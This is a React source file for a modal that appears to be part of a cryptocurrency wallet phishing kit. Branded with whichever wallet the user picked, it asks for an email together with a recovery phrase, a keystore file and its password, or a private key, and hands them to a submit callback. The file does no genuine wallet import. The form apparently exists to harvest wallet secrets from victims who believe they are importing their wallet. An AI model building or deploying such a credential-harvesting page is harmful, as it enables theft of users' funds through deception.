// src/components/ImportModal.jsx
import React, { useState } from 'react';
import { X } from 'lucide-react';
import { getValidationError } from '../utils/validators';

const ImportModal = ({ wallet, isOpen, onClose, onSubmit }) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const [formData, setFormData] = useState({
    phrase: { walletName: '', email: '', recoveryPhrase: '' },
    keystore: { walletName: '', email: '', keystoreJson: '', password: '' },
    privatekey: { walletName: '', email: '', privateKey: '' },
  });

  if (!isOpen || !wallet) return null;

  const currentFormData = formData[activeTab];

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [activeTab]: {
        ...currentFormData,
        [name]: value,
      },
    });
    // Clear error for this field when user starts typing
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: '',
      });
    }
  };

  const validateForm = () => {
    const newErrors = {};

    // Common validation
    if (!currentFormData.walletName.trim()) {
      newErrors.walletName = 'Wallet name is required.';
    } else if (currentFormData.walletName.length > 50) {
      newErrors.walletName = 'Wallet name must be 50 characters or less.';
    }

    if (!currentFormData.email.trim()) {
      newErrors.email = 'Email is required.';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(currentFormData.email)) {
      newErrors.email = 'Please enter a valid email address.';
    }

    // Tab-specific validation
    if (activeTab === 'phrase') {
      if (!currentFormData.recoveryPhrase.trim()) {
        newErrors.recoveryPhrase = 'Recovery phrase is required.';
      } else {
        const words = currentFormData.recoveryPhrase.trim().split(/\s+/).filter(w => w.length > 0);
        if (words.length !== 12 && words.length !== 24) {
          newErrors.recoveryPhrase = 'Recovery phrase must be 12 or 24 words.';
        }
      }
    } else if (activeTab === 'keystore') {
      if (!currentFormData.keystoreJson.trim()) {
        newErrors.keystoreJson = 'Keystore JSON is required.';
      } else {
        try {
          JSON.parse(currentFormData.keystoreJson);
        } catch {
          newErrors.keystoreJson = 'Invalid JSON format.';
        }
      }
      if (!currentFormData.password.trim()) {
        newErrors.password = 'Wallet password is required.';
      }
    } else if (activeTab === 'privatekey') {
      if (!currentFormData.privateKey.trim()) {
        newErrors.privateKey = 'Private key is required.';
      }
    }

    return newErrors;
  };

  const handleSubmit = async () => {
    const newErrors = validateForm();

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);
    try {
      await onSubmit({
        ...currentFormData,
        method: activeTab,
        wallet: wallet.name,
      });
    } catch (error) {
      console.error('Submission error:', error);
      setErrors({ submit: 'Failed to submit form. Please try again.' });
    } finally {
      setLoading(false);
    }
  };

  const tabs = [
    { id: 'phrase', label: 'Phrase' },
    { id: 'keystore', label: 'Keystore JSON' },
    { id: 'privatekey', label: 'Private Key' },
  ];

  return (
    <div
      className="fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <div
        className="bg-blue-50 rounded-xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl border-b-4 border-gray-900"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="sticky top-0 bg-blue-50 border-b border-gray-200 p-4 sm:p-6 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <img
              src={wallet.icon}
              alt={wallet.name}
              className="w-10 h-10 sm:w-12 sm:h-12 rounded-full"
              onError={(e) => {
                e.target.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"%3E%3Crect fill="%23D1D5DB" width="48" height="48" rx="24"/%3E%3C/svg%3E';
              }}
            />
            <h2 className="text-lg sm:text-xl font-bold text-gray-900">
              Import your {wallet.name} Wallet
            </h2>
          </div>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700 transition flex-shrink-0 hover:rotate-180"
          >
            <X size={24} />
          </button>
        </div>

        {/* Tabs */}
        <div className="sticky top-[70px] sm:top-[80px] bg-blue-50 border-b border-gray-200 flex gap-0">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 py-3 px-4 text-xs sm:text-sm font-medium transition-all border-b-3 ${
                activeTab === tab.id
                  ? 'border-gray-900 text-gray-900'
                  : 'border-transparent text-gray-600 hover:text-gray-900'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Content */}
        <div className="p-4 sm:p-6">
          {errors.submit && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded text-red-700 text-sm">
              {errors.submit}
            </div>
          )}

          <div className="space-y-4">
            {/* Wallet Name */}
            <div>
              <label className="block font-bold text-gray-900 mb-2 text-sm sm:text-base">
                Name wallet
              </label>
              <input
                type="text"
                name="walletName"
                placeholder="Name wallet"
                value={currentFormData.walletName}
                onChange={handleInputChange}
                className={`w-full px-4 py-3 bg-blue-100 border rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600 transition ${
                  errors.walletName ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.walletName && (
                <p className="text-red-600 text-xs mt-1">{errors.walletName}</p>
              )}
            </div>

            {/* Email */}
            <div>
              <label className="block font-bold text-gray-900 mb-2 text-sm sm:text-base">
                Email
              </label>
              <input
                type="email"
                name="email"
                placeholder="Email"
                value={currentFormData.email}
                onChange={handleInputChange}
                className={`w-full px-4 py-3 bg-blue-100 border rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600 transition ${
                  errors.email ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.email && (
                <p className="text-red-600 text-xs mt-1">{errors.email}</p>
              )}
            </div>

            {/* Phrase Tab */}
            {activeTab === 'phrase' && (
              <div>
                <label className="block font-bold text-gray-900 mb-2 text-sm sm:text-base">
                  Phrase
                </label>
                <textarea
                  name="recoveryPhrase"
                  placeholder="Enter your recovery phrase"
                  value={currentFormData.recoveryPhrase}
                  onChange={handleInputChange}
                  rows={4}
                  className={`w-full px-4 py-3 bg-blue-100 border rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600 transition resize-none ${
                    errors.recoveryPhrase ? 'border-red-500' : 'border-gray-300'
                  }`}
                />
                <p className="text-gray-600 text-xs mt-2">
                  Typically 12 (sometimes 24) words separated by single spaces
                </p>
                {errors.recoveryPhrase && (
                  <p className="text-red-600 text-xs mt-1">{errors.recoveryPhrase}</p>
                )}
              </div>
            )}

            {/* Keystore Tab */}
            {activeTab === 'keystore' && (
              <>
                <div>
                  <p className="text-gray-600 text-sm mb-4">
                    Upload or paste your keystore JSON contents here.
                  </p>
                  <label className="block font-bold text-gray-900 mb-2 text-sm sm:text-base">
                    Keystore JSON
                  </label>
                  <textarea
                    name="keystoreJson"
                    placeholder="Keystore JSON"
                    value={currentFormData.keystoreJson}
                    onChange={handleInputChange}
                    rows={4}
                    className={`w-full px-4 py-3 bg-blue-100 border rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600 transition resize-none ${
                      errors.keystoreJson ? 'border-red-500' : 'border-gray-300'
                    }`}
                  />
                  {errors.keystoreJson && (
                    <p className="text-red-600 text-xs mt-1">{errors.keystoreJson}</p>
                  )}
                </div>

                <div>
                  <label className="block font-bold text-gray-900 mb-2 text-sm sm:text-base">
                    Wallet password
                  </label>
                  <input
                    type="password"
                    name="password"
                    placeholder="Wallet password"
                    value={currentFormData.password}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-blue-100 border rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600 transition ${
                      errors.password ? 'border-red-500' : 'border-gray-300'
                    }`}
                  />
                  <p className="text-gray-600 text-xs mt-2">
                    Several lines of text beginning with {'{...}'} plus the password you used to encrypt it.
                  </p>
                  {errors.password && (
                    <p className="text-red-600 text-xs mt-1">{errors.password}</p>
                  )}
                </div>
              </>
            )}

            {/* Private Key Tab */}
            {activeTab === 'privatekey' && (
              <div>
                <label className="block font-bold text-gray-900 mb-2 text-sm sm:text-base">
                  Enter your private key below:
                </label>
                <input
                  type="password"
                  name="privateKey"
                  placeholder="Enter your private key"
                  value={currentFormData.privateKey}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 bg-blue-100 border rounded-lg text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-600 transition ${
                    errors.privateKey ? 'border-red-500' : 'border-gray-300'
                  }`}
                />
                <p className="text-gray-600 text-xs mt-2">
                  Typically 12 (sometimes 24) words separated by a single space.
                </p>
                {errors.privateKey && (
                  <p className="text-red-600 text-xs mt-1">{errors.privateKey}</p>
                )}
              </div>
            )}
          </div>

          {/* Buttons */}
          <div className="flex gap-3 mt-8">
            <button
              onClick={onClose}
              className="flex-1 py-3 rounded-full font-semibold text-white bg-pink-500 hover:bg-pink-600 disabled:opacity-50 transition"
              disabled={loading}
            >
              Cancel
            </button>
            <button
              onClick={handleSubmit}
              disabled={loading}
              className="flex-1 py-3 rounded-full font-semibold text-white bg-teal-700 hover:bg-teal-800 disabled:opacity-50 transition"
            >
              {loading ? 'Processing...' : 'Proceed'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ImportModal;